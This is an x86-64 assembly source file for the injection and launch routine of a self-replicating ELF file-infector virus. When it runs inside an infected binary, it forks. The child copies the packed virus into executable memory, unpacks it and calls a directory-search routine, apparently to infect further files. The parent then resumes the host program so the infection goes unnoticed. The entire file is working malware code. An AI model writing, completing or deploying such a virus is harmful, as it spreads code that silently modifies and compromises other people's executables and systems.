%include "constants.inc"
%include "data.inc"

section .text

extern _search_dir
extern _exit

_global _inject

_inject:
	pop r8; pop addr from stack
	sub r8, 0x5; sub call instr
	; r8 contains the entry of the virus (for infected file cpy)

	; copy the prg in memory and launch it
	xor rax, rax; = 0
	cmp rax, [rel entry_inject]; if entry_inject isn't set we are in host
	jne .infected

	mov rax, SYSCALL_FORK; fork
	syscall
	cmp rax, 0x0
	jnz _exit

	; host part
	call _search_dir
	jmp _exit

	.infected:
		mov rax, SYSCALL_FORK; fork
		syscall

		cmp rax, 0x0
		jz .virus

		jmp .prg
		.virus:
			push rdx
			push r8
			; copy the virus into a mmap executable
			xor rdi, rdi; NULL

			lea rsi, [rel _eof]
			lea r8, [rel _params]
			sub rsi, r8
			push 7
			pop rdx; PROT_READ | PROT_WRITE | PROT_EXEC
			push 34
			pop r10; MAP_PRIVATE | MAP_ANON
			push -1
			pop r8 ; fd
			xor r9, r9; offset
			push SYSCALL_MMAP
			pop rax; mmap
			syscall

			push rsi; save length

	;		memcpy(void *dst, void *src, size_t len)
			push rax
			pop rdi ; addr
			lea rsi, [rel _params]
			lea rdx, [rel _pack_start]
			sub rdx, rsi
			call _ft_memcpy

			mov r9, rdi; save addr
	;		unpack(void *dst, void *src, size_t len)
			add rdi, rdx
			add rsi, rdx
			mov rax, [rel length]
			sub rax, rdx; length - [packed_part - params]
			push rax
			pop rdx

			call _unpack

			push r9
			pop rdi
			pop rsi

			pop r8

			push rsi ; save length

			lea rsi, [rel _params]
			lea rax, [rel _search_dir]
			sub rax, rsi
			add rax, rdi

			push rdi ; save addr

			call rax ; jump to mmaped memory

			pop rdi ; pop addr
			pop rsi ; pop length

			; munmap the previous exec
			push SYSCALL_MUNMAP
			pop rax
			syscall
			pop rdx

			call _exit
		.prg:
			; end infected file
			push r8
			pop rax

			sub rax, [rel entry_inject]
			add rax, [rel entry_prg]

			; jmp on entry_prg
			jmp rax
